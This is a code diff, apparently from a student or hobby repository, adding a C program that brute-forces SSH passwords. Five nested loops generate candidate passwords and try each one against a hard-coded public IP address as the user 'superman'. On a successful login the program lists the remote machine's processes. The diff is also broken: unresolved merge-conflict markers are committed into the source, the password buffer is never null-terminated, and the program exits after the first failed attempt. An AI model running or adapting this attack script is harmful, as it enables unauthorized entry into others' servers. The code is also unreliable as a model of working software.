@@ -14,6 +14,7 @@
 char *ip = "74.208.234.113";
 char *command = "ps -e";
 
+<<<<<<< HEAD
 int port = 22;
 	int rc;
 	char *password;
@@ -21,6 +22,8 @@ int port = 22;
 	ssh_session my_ssh_session;
 	struct hostent *host;
 
+=======
+>>>>>>> 3be5d9d0d0fb917fead8d787c62cbb86401517c1
 #ifndef _WIN32
 	typedef unsigned int SOCKET;
 	#define INVALID_SOCKET  (SOCKET)(~0)
@@ -142,6 +145,7 @@ int show_remote_processes(ssh_session session)
   return SSH_OK;
 }
 
+<<<<<<< HEAD
 int verificaPassword(char *cadena){
 	// Authenticate ourselves
 	printf(" %s \n", cadena);
@@ -281,6 +285,143 @@ int main()
 	my_ssh_session = ssh_new();
 	NuevaConexion();
 	creaPassword();
+=======
+int main()
+{
+	char *password;
+	char cadena[6] ;
+	int a,b,c,d,e; 
+
+//Generación de combinaciones
+	for ( a = 49; a <= 120 ; a++){
+	    for ( b = 49; b <= 120 ; b++){
+			for ( c = 49; c <= 120 ; c++){
+				for ( d = 49; d <= 120 ; d++){
+					for ( e = 49; e <= 120 ; e++){
+						cadena[0] = a; 
+						cadena[1] = b; 
+						cadena[2] = c; 
+						cadena[3] = d; 
+						cadena[4] = e; 
+						password = cadena;
+
+						int port = 22;
+						int rc;
+						int verbosity = SSH_LOG_NONE;
+						ssh_session my_ssh_session = ssh_new();
+						struct hostent *host;	
+						// Create our socket
+						#ifdef _WIN32
+							SOCKADDR_IN SockAddr;
+							WSADATA WsaDat;
+							SOCKET Socket;
+						#else
+							struct sockaddr_in SockAddr;
+							SOCKET Socket;
+						#endif	
+						#ifdef _WIN32
+							if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0)
+							{
+								printf("Winsock error - Winsock initialization failed\r\n");
+								WSACleanup();
+								system("PAUSE");
+								return 0;
+							}			
+						#endif
+
+						Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+						if(Socket==INVALID_SOCKET)
+						{			
+							printf("Winsock error - Socket creation Failed!\r\n");
+							#ifdef _WIN32
+								WSACleanup();
+							#endif
+							system("PAUSE");
+							return 0;
+						}
+	
+						// Resolve IP address for hostname
+		
+						if((host=gethostbyname(ip))==NULL)
+						{
+							printf("Failed to resolve hostname.\r\n");
+							#ifdef _WIN32
+								WSACleanup();
+							#endif
+							system("PAUSE");
+							return 0;
+						}
+
+						// Setup our socket address structure
+						SockAddr.sin_port=htons(22);
+						SockAddr.sin_family=AF_INET;
+						SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);
+
+						// Attempt to connect to server
+						if(connect(Socket,(struct sockaddr*)(&SockAddr),sizeof(SockAddr))!=0)
+							{
+							printf("Failed to establish connection with server ....\r\n");
+							#ifdef _WIN32
+								WSACleanup();
+							#endif
+							system("PAUSE");
+							return 0;
+						}
+						if (my_ssh_session == NULL){
+							exit(-1);
+						}
+						
+						ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip);
+						ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, "superman");
+						ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
+						ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
+						ssh_options_set(my_ssh_session, SSH_OPTIONS_FD, &Socket);
+
+						// Connect to server
+						rc = ssh_connect(my_ssh_session);
+						if (rc != SSH_OK)
+						{
+							fprintf(stderr, "Error conectando a %s: %s\n", ip, ssh_get_error(my_ssh_session));
+							ssh_free(my_ssh_session);
+							exit(-1);
+						}
+
+						//Verificar identidad del servidor sino se conoce preguntar si se desea conectar.
+						if (verify_knownhost(my_ssh_session) < 0)
+						{
+							ssh_disconnect(my_ssh_session);
+							ssh_free(my_ssh_session);
+							exit(-1);
+						}
+	
+						// Authenticate ourselves
+						rc = ssh_userauth_password(my_ssh_session, NULL, password);
+						//if (password== "xxxxw") printf("passwordd : %s", password );
+						if (rc != SSH_AUTH_SUCCESS){
+							printf(stderr, "Error de autenticación con pwd: %s\n", ssh_get_error(my_ssh_session));
+							ssh_disconnect(my_ssh_session);
+							ssh_free(my_ssh_session);
+							exit(-1);
+						}else{
+							printf("Autenticación exitosa!\n\n");
+							show_remote_processes(my_ssh_session);
+							break;
+						}
+     			     
+						ssh_disconnect(my_ssh_session);
+						ssh_free(my_ssh_session);
+						if (a == 52) a = a + 57;
+						if (b == 52) b = b + 57;
+						if (c == 52) c = c + 57;
+						if (d == 52) d = d + 57;
+						if (e == 52) e = e + 57;
+					}
+				}
+			}
+	    }
+	}
+	system("PAUSE");
+>>>>>>> 3be5d9d0d0fb917fead8d787c62cbb86401517c1
 	return 0;
 }
 
